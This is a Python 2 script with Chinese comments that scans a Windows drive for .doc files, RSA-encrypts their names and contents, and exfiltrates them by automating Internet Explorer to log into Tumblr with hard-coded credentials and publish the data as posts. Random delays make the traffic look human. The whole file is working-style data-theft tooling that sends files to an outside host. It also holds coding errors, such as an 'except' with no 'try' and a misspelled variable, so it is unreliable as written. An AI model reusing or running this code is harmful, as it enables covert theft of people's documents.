#coding=utf-8

import win32com.client
import os
import fnmatch
import time
import random
import zlib

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

doc_type  = ".doc"

# 我们的Tumblr账户和口令
username  = "jms@bughunter.ca"
password  = "justinBHP2014"

public_key = ""


def wait_for_browser(browser):
    
    # 等待浏览器加载完一个页面
    while browser.ReadyState != 4 and browser.ReadyState != "complete":
        time.sleep(0.1)
    
    return


# 现在，我们将添加用于加密文件名和文件内容的函数
def encrypt_string(plaintext):
    
    chunk_size = 256
    print "Compressing: %d bytes" % len(plaintext)
    plaintext = zlib.compress(plaintext)
    
    print "Encrypting %d bytes" % len(plaintext)
    
    rsakey = RSA.importKey(public_key)
    rsakey = PKCS1_OAEP.new(rsakey)
    
    encrypted = ""
    offset    = 0
    
    while offset < len(plaintext):
        
        chunk = plaintext[offset:offset+chunk_size]
        
        if len(chunk) % chunk_size != 0:
            chunk += " " * (chunk_size - len(chunk))
        
        encrypted += rsakey.encrypt(chunk)
        offset    += chunk_size
    
    
    encrypted = encrypted.encode("base64")
    
    print "Base64 encoded crypto: %d" % len(encrypted)
    
    return encrypted

def encrypt_post(filename):
    
    # 打开并读取文件
    fd = open(filename, "rb")
    contents = fd.read()
    fd.close()
    
    
    encrypt_title = encrypt_string(filename)
    encrypt_body  = encrypt_string(contents)
    
    
    return encrypt_title, encrypt_body

def random_sleep():
    time.sleep(random.randint(5, 10))
    return

def login_to_tumblr(ie):
    
    # 解析文档中的所有元素
    full_doc = ie.Document.all
    
    # 迭代每个元素来查找登录表单
    for i in full_doc:
        if i.id == "signup_email":
            i.setAttribute("value", username)
        elif i.id == "signup_password":
            i.setAttribute("value", password)
    
    random_sleep()
    
    # 你会遇到不同的登录主页
    if ie.Document.forms[0].id == "signup_form":
        ie.Document.form[0].submit()
    else:
        ie.Document.form[1].submit()
        
    except IndexError, e:
        pass
    
    
    random_sleep()
    
    
    # 登录表单是登录页面中的第二个表单
    wait_for_browser(ie)
    
    return


def post_to_tumblr(ie, title, post):
    
    full_doc = ie.Document.all
    
    for i in full_duc:
        if i.id == "post_one":
            i.setAttribute("value", title)
            title_box = i
            i.focus()
        elif i.id == "post_two":
            i.setAttribute("innerHTML", post)
            print "Set text area"
            i.focus()
        elif i.id == "create_post":
            print "Found post button"
            post_form = i
            i.focus()
    
    # 将浏览器的焦点从输入主体内容的窗口上移开
    random_sleep()
    title_box.focus()
    random_sleep()
    
    # 提交表单
    post_form.children[0].click()
    wait_for_browser(ie)
    
    random_sleep()
    
    return

def exfiltrate(document_path):
    
    ie = win32com.client.Dispatch("InternetExplorer.Application")
    ie.Visible = 1 # 创建实例的过程可见，0为不可见
    
    # 访问tumblr站点并登录
    ie.Navigate("http://www.tumblr.com/login")
    wait_for_browser(ie)
    
    print "Logging in..."
    login_to_tumblr(ie)
    print "Logged in...navigating"
    
    ie.Navigate("https://www.tumblr.com/new/text")
    wait_for_browser(ie)
    
    # 加密文件
    title, body = encrypt_post(document_path)
    
    print "Creating new post..."
    post_to_tumblr(ie, title, body)
    print "Posted!"
    
    # 销毁IE实例
    ie.Quit()
    ie = None
    
    return

# 用户文档检索的主循环
# 注意：以下这段代码的第一行没有“tab”缩进
for parent, directories, filenames in os.walk("C:\\"):
    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
        document_path = os.path.join(parent, filename)
        print "Found: %s" % document_path
        exfiltrate(document_path)
        raw_input("Continue?")